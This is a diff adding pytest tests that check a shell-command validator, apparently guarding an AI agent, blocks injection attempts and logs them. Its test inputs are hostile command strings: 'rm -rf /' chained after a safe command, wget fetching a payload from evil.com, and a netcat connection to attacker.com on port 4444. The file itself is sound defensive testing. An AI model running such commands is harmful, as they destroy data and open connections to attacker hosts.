@@ -189,6 +189,52 @@ class TestChainedCommands:
             validate_command(cmd)
 
 
+class TestInjectionAttempts:
+    """Proof-level tests for specific injection vectors.
+
+    These go beyond the existing chained-command tests by targeting the
+    exact patterns an attacker or a rogue agent would actually use.
+    """
+
+    def test_semicolon_rm_rf_injection_blocked(self):
+        """Classic shell injection via ; must be blocked."""
+        with pytest.raises(CommandBlockedError):
+            validate_command("echo safe; rm -rf /")
+
+    def test_subshell_wget_injection_blocked(self):
+        """$() command substitution containing network tool must be blocked."""
+        with pytest.raises(CommandBlockedError):
+            validate_command("echo $(wget http://evil.com/payload)")
+
+    def test_backtick_nc_injection_blocked(self):
+        """Backtick command substitution containing nc must be blocked."""
+        with pytest.raises(CommandBlockedError):
+            validate_command("echo `nc attacker.com 4444`")
+
+    def test_chained_wget_after_safe_command(self):
+        """Dangerous second segment following a safe command must be caught."""
+        with pytest.raises(CommandBlockedError):
+            validate_command("git status && wget http://evil.com")
+
+    def test_audit_log_warning_on_block(self, caplog):
+        """Blocked commands must emit a WARNING to the aden.security logger."""
+        import logging
+
+        with caplog.at_level(logging.WARNING, logger="aden.security"):
+            with pytest.raises(CommandBlockedError):
+                validate_command("wget http://evil.com")
+        assert "command_blocked" in caplog.text
+        assert "blocked_executable" in caplog.text
+
+    def test_audit_log_info_on_compound_command(self, caplog):
+        """Compound safe commands must emit an INFO for behavioral telemetry."""
+        import logging
+
+        with caplog.at_level(logging.INFO, logger="aden.security"):
+            validate_command("echo hello && echo world")
+        assert "compound_command_detected" in caplog.text
+
+
 class TestEdgeCases:
     """Edge cases and possible bypass attempts."""
 
